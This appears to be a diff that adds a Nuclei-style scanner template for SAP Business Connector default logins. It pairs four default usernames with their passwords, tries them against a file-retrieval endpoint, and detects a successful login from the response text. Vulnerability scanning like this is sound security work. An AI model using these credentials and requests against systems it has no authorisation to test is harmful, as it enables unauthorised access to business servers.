@@ -1,0 +1,44 @@
+id: sap-business-connector
+
+info:
+  name: SAP Business Connector Default Credentials
+  description: SAP Business Connector Default Credentials
+  severity: high
+  author: ChristianPoeschl, OleWagner,usdAG
+  tags: default-login,sap
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/invoke/pub.file/getFile"
+    headers:
+      Authorization: "{{base64(username + ':' + password)}}"
+      Cookie: ssnid=
+    payloads:
+      username:
+        - Administrator
+        - Developer
+        - Replicator
+        - SAPUser
+      password:
+        - manage
+        - isdev
+        - iscopy
+        - 22101999
+    stop-at-first-match: false
+    attack: pitchfork
+    cookie-reuse: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - com.wm.app.b2b.server
+          - No filename supplied
+      - type: word
+        condition: and
+        negative: true
+        words:
+          - com.wm.app.b2b.server.AccessException
+          - Invalid credentials
